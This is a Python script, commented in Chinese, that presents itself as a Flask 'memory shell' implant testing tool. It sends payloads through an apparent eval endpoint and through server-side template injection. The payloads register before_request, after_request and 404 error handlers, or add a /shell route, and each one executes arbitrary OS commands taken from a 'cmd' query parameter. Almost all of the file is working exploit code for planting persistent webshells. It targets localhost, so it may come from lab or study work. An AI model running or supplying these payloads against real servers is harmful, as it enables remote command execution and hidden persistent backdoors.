#!/usr/bin/env python3
import requests
import urllib.parse
import time
import argparse

BASE_URL = "http://127.0.0.1:5000"

def url_encode(payload):
    """对payload进行URL编码"""
    return urllib.parse.quote_plus(payload)

def test_command(url, cmd="whoami", param="cmd"):
    """测试命令执行"""
    full_url = f"{url}?{param}={cmd}"
    try:
        resp = requests.get(full_url)
        print(f"命令输出: {resp.text}")
        return resp.text.strip()
    except Exception as e:
        print(f"错误: {e}")
        return None

def implant_before_request_memshell():
    """植入before_request内存马"""
    print("[+] 正在植入before_request内存马...")
    
    payload = """app.before_request_funcs.setdefault(None, []).append(lambda: __import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read()) if request.args.get('cmd') else None)"""
    
    url = f"{BASE_URL}/e?cmd={url_encode(payload)}"
    try:
        resp = requests.get(url)
        if "1" in resp.text:
            print("[+] before_request内存马植入成功!")
            test_command(BASE_URL)
            return True
        else:
            print("[-] before_request内存马植入失败")
            return False
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False

def implant_after_request_memshell():
    """植入after_request内存马"""
    print("[+] 正在植入after_request内存马...")
    
    payload = """app.after_request_funcs.setdefault(None, []).append(lambda resp: __import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read()) if request.args.get('cmd') else resp)"""
    
    url = f"{BASE_URL}/e?cmd={url_encode(payload)}"
    try:
        resp = requests.get(url)
        if "1" in resp.text:
            print("[+] after_request内存马植入成功!")
            test_command(BASE_URL)
            return True
        else:
            print("[-] after_request内存马植入失败")
            return False
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False

def implant_errorhandler_memshell():
    """植入errorhandler内存马"""
    print("[+] 正在植入errorhandler内存马...")
    
    payload = """exec("global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()")"""
    
    url = f"{BASE_URL}/e?cmd={url_encode(payload)}"
    try:
        resp = requests.get(url)
        if "1" in resp.text:
            print("[+] errorhandler内存马植入成功!")
            test_command(f"{BASE_URL}/nonexistent")
            return True
        else:
            print("[-] errorhandler内存马植入失败")
            return False
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False

def implant_ssti_memshell():
    """通过模板注入植入内存马"""
    print("[+] 正在通过SSTI植入内存马...")
    
    payload = """{{request.__class__.__init__.__globals__['__builtins__']['eval']("app.before_request_funcs.setdefault(None, []).append(lambda :__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read()) if request.args.get('cmd') else None)")}}"""
    
    url = f"{BASE_URL}/test?name={url_encode(payload)}"
    try:
        resp = requests.get(url)
        print("[+] SSTI内存马植入完成，测试中...")
        time.sleep(1)  # 等待内存马生效
        result = test_command(BASE_URL)
        if result:
            print("[+] SSTI内存马植入成功!")
            return True
        else:
            print("[-] SSTI内存马植入失败")
            return False
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False
        
def add_url_rule_memshell():
    """尝试使用add_url_rule添加路由（在新版Flask中可能受限）"""
    print("[+] 尝试使用add_url_rule添加路由...")
    
    payload = """app.add_url_rule('/shell', 'shell', lambda: __import__('os').popen(request.args.get('cmd', 'whoami')).read())"""
    
    url = f"{BASE_URL}/e?cmd={url_encode(payload)}"
    try:
        resp = requests.get(url)
        if "1" in resp.text:
            print("[+] add_url_rule路由添加成功!")
            test_command(f"{BASE_URL}/shell")
            # 验证路由是否添加成功
            resp = requests.get(f"{BASE_URL}/debug")
            if "/shell" in resp.text:
                print("[+] 路由验证成功!")
                return True
            else:
                print("[-] 路由未成功添加")
                return False
        else:
            print("[-] add_url_rule路由添加失败")
            return False
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Flask内存马植入工具')
    parser.add_argument('--method', '-m', choices=['before', 'after', 'error', 'ssti', 'url_rule', 'all'], 
                        default='all', help='内存马植入方法')
    args = parser.parse_args()
    
    print("=" * 50)
    print("Flask内存马植入测试工具")
    print("=" * 50)
    
    if args.method == 'before' or args.method == 'all':
        implant_before_request_memshell()
        print("-" * 50)
    
    if args.method == 'after' or args.method == 'all':
        implant_after_request_memshell()
        print("-" * 50)
    
    if args.method == 'error' or args.method == 'all':
        implant_errorhandler_memshell()
        print("-" * 50)
    
    if args.method == 'ssti' or args.method == 'all':
        implant_ssti_memshell()
        print("-" * 50)
    
    if args.method == 'url_rule' or args.method == 'all':
        add_url_rule_memshell()
        print("-" * 50)
    
    print("测试完成！") 